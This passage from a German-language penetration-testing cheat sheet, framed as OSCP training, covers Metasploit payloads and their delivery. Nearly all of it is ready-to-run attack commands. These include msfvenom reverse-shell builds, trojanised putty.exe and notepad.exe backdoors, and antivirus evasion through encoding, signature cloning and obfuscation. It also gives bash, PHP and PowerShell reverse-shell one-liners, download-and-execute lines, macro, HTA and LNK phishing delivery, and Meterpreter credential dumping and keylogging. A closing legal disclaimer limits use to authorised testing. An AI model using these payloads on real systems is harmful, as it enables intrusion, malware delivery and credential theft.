# Stage 2: Vollständiger Meterpreter
```
**Vorteile**:
- Kleine initiale Payload
- Flexibel, Stage 2 kann geändert werden
- Bypass von size restrictions

**Nachteile**:
- Stage 2 Download kann blockiert werden
- Benötigt zweite Verbindung
- Langsamer

### 61. Stageless Payloads
**Format**: `<platform>/<arch>/<payload>_reverse_tcp`
```bash
# Beispiel
windows/meterpreter_reverse_tcp

# Funktionsweise:
# Kompletter Meterpreter in einer Payload
```
**Vorteile**:
- Zuverlässiger (keine Stage 2 nötig)
- Funktioniert auch wenn Stage 2 blockiert
- Schneller

**Nachteile**:
- Größere Datei
- Weniger flexibel

### 62. Wann welche?
```bash
# Staged verwenden wenn:
# - Size restrictions (z.B. Buffer Overflow mit wenig Platz)
# - Flexibilität wichtig
# - Testing/Development

# Stageless verwenden wenn:
# - Zuverlässigkeit wichtig
# - Firewalls/IDS könnten Stage 2 blocken
# - Production Engagements
# - File size kein Problem
```

---

## Payload Customization

### 63. Custom Payload Variables
```bash
# LHOST Alternativen
LHOST=10.10.14.5        # Direkte IP
LHOST=attacker.com      # Domain (DNS)
LHOST=0.0.0.0           # Any interface (Listener only)

# LPORT
LPORT=4444              # Standard
LPORT=443               # HTTPS (weniger suspicious)
LPORT=80                # HTTP (oft erlaubt in Firewall)
LPORT=53                # DNS (fast nie geblockt)

# Exitfunc (wie Payload beendet)
EXITFUNC=thread         # Safe (default) - nur Thread beenden
EXITFUNC=process        # Ganzen Prozess beenden
EXITFUNC=seh            # SEH
EXITFUNC=none           # Kein Exit

# PrependMigrate (Auto-Migration)
PrependMigrate=true
PrependMigrateProc=explorer.exe
```

### 64. Payload mit SessionRetryTotal
```bash
# Handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444

# Retry Settings
set SessionRetryTotal 30        # Versuche 30x zu verbinden
set SessionRetryWait 10         # Warte 10 sec zwischen Versuchen
set EnableStageEncoding true    # Stage 2 verschlüsseln
run
```

### 65. Custom Templates
```bash
# Eigenes Template verwenden
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x notepad.exe -k -f exe -o backdoor.exe

# -x: Template file
# -k: Keep template behavior (inject statt replace)

# Funktioniert mit:
# - .exe (Windows)
# - .elf (Linux)
# - .apk (Android)
```

---

## AV Evasion Techniken

### 66. Basic Evasion
```bash
# Encoding (mehrfach)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Template Injection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x putty.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o putty_backdoor.exe

# Verschlüsseltes Payload Format
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o https_shell.exe
```

### 67. Veil Framework
```bash
# Veil installieren
apt install veil

# Veil starten
veil

# Use Evasion
use evasion

# List payloads
list

# Use C# Payload (meist besser gegen AV)
use cs/meterpreter/rev_tcp.py
set LHOST 10.10.14.5
set LPORT 4444
generate
```

### 68. Custom Encrypter/Packer
```bash
# SigThief (Signature Cloning)
python sigthief.py -i legitimate.exe -t malicious.exe -o signed_malicious.exe

# UPX Packer (NOT recommended - erkannt)
upx -9 payload.exe

# Custom Packer/Crypter
# - Enigma Protector
# - Themida
# - VMProtect
```

### 69. Shellter
```bash
# Shellter (Wine on Linux)
shellter

# Auto Mode
A

# Select PE Target (z.B. putty.exe)
/path/to/putty.exe

# Enable Stealth Mode
Y

# Use custom payload
C

# Payload Path (msfvenom raw)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o payload.bin
```

### 70. PowerShell Obfuscation
```bash
# Invoke-Obfuscation
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Set Script
SET SCRIPTBLOCK <paste msfvenom psh output>

# Obfuscate
TOKEN
ALL
1

# Out
OUT payload_obfuscated.ps1
```

---

## Alternative Shells

### 71. Netcat Reverse Shells
```bash
# Payload generieren
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.5 LPORT=4444 -f raw

# Listener
nc -nlvp 4444

# Windows Netcat
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o nc_shell.exe
```

### 72. Bash Reverse Shell
```bash
# Payload
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh

# Listener
nc -nlvp 4444

# Manual Bash One-liner:
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### 73. PHP Reverse Shell
```php
# Pentest Monkey PHP Reverse Shell
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'");
?>

# Oder msfvenom:
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

### 74. PowerShell Reverse Shell (ohne msfvenom)
```powershell
# Nishang Invoke-PowerShellTcp.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444"

# One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Payload Delivery Methods

### 75. HTTP/HTTPS Delivery
```bash
# Python Web Server
python3 -m http.server 80

# Apache
cp payload.exe /var/www/html/
systemctl start apache2

# Download auf Opfer:
# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/payload.exe','C:\temp\payload.exe')"

# Certutil
certutil -urlcache -f http://10.10.14.5/payload.exe payload.exe

# Wget (Linux)
wget http://10.10.14.5/payload.elf -O /tmp/payload
chmod +x /tmp/payload

# Curl
curl http://10.10.14.5/payload.elf -o /tmp/payload
```

### 76. SMB Delivery
```bash
# Impacket SMB Server
impacket-smbserver share /root/payloads -smb2support

# Auf Opfer:
copy \\10.10.14.5\share\payload.exe C:\temp\

# Direkt ausführen:
\\10.10.14.5\share\payload.exe
```

### 77. Macro Delivery (Office)
```bash
# VBA Payload generieren
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f vba-exe -o macro.vba

# In Word/Excel:
# View -> Macros -> Create
# Paste VBA code
# Save as .docm oder .xlsm

# Social Engineering Email:
# "Please enable macros to view this document"
```

### 78. HTA Delivery
```bash
# HTA Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hta-psh -o evil.hta

# Hosting
python3 -m http.server 80

# Opfer:
mshta http://10.10.14.5/evil.hta
```

### 79. LNK File (Shortcut)
```bash
# Windows Shortcut mit Payload
# Powershell Script erstellen: evil.ps1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')

# LNK erstellen die evil.ps1 ausführt:
# Target: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -w hidden -f \\10.10.14.5\share\evil.ps1

# Icon auf Dokument ändern für Social Engineering
```

### 80. ISO/VHD Delivery
```bash
# ISO mit Payload erstellen
mkdir iso_content
cp payload.exe iso_content/
genisoimage -o malicious.iso iso_content/

# User mounted ISO -> Payload ausführbar
# Umgeht oft Mark-of-the-Web Schutz
```

---

## Empfohlene Payloads nach Szenario

### Windows Target (Standard)
```bash
# Stageless, HTTPS, x64
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
```

### Windows Target (AV Heavy)
```bash
# Template Injection + Encoding + HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -x putty.exe -k -e x64/xor_dynamic -i 5 -f exe -o putty_backdoor.exe

# Oder: Veil Framework / Shellter
```

### Linux Target
```bash
# Stageless x64
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

### Web Server (PHP)
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
echo "<?php " > final.php
cat shell.php >> final.php
```

### Web Server (JSP/Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

### Internal Network (Firewall)
```bash
# DNS Tunnel oder ICMP (advanced)
# Bind Shell als Fallback
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
```

### Mobile (Android)
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -o legit_app.apk
```

---

## Cheat Sheet Quick Reference

### Top 10 Payloads
```bash
# 1. Windows x64 HTTPS (Stageless)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe

# 2. Windows x64 TCP (Stageless)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# 3. Windows x86 TCP (Compatibility)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# 4. Linux x64
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# 5. PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# 6. JSP/WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war

# 7. PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh -o shell.ps1

# 8. ASP/ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx

# 9. Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o app.apk

# 10. Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.py
```

### Top Listener Setups
```bash
# 1. Basic Handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"

# 2. HTTPS Handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_https; set LHOST 10.10.14.5; set LPORT 443; run"

# 3. Multi-Session Handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j"
```

### Quick Meterpreter Commands
```bash
sysinfo              # System info
getuid               # Current user
getsystem            # Escalate to SYSTEM
hashdump             # Dump password hashes
load kiwi; creds_all # Mimikatz credentials
screenshot           # Screenshot
keyscan_start        # Start keylogger
ps                   # Process list
migrate PID          # Migrate to process
shell                # Get CMD shell
download file        # Download file
upload file          # Upload file
portfwd add -l 3389 -p 3389 -r IP  # Port forward
route add IP 255.255.255.0 SESSION # Add route
```

---

## Wichtige Hinweise

- **Testing**: Immer Payloads vorher in kontrollierter Umgebung testen
- **Staged vs Stageless**: Stageless ist zuverlässiger, Staged ist kleiner
- **HTTPS vs TCP**: HTTPS ist stealthier, TCP ist schneller
- **Encoding**: Hilft gegen einfache AV, aber nicht gegen moderne EDR
- **Templates**: Signierte EXEs als Template erhöhen Erfolgsrate
- **Migration**: Immer zu stabilem Prozess migrieren (explorer.exe)
- **Persistence**: Nur mit Erlaubnis! Kann System beschädigen
- **AV Evasion**: Kein Encoder ist perfect - Custom Crypter meist nötig
- **Firewall**: Port 443, 80, 53 haben höchste Erfolgschance

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Forensische Analysen auf eigenen Systemen
- Sicherheitsforschung in kontrollierten Umgebungen
- Defensive Security und Incident Response

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**System**: Multi-Platform
**Kontext**: Autorisierter Penetrationstest / OSCP Training
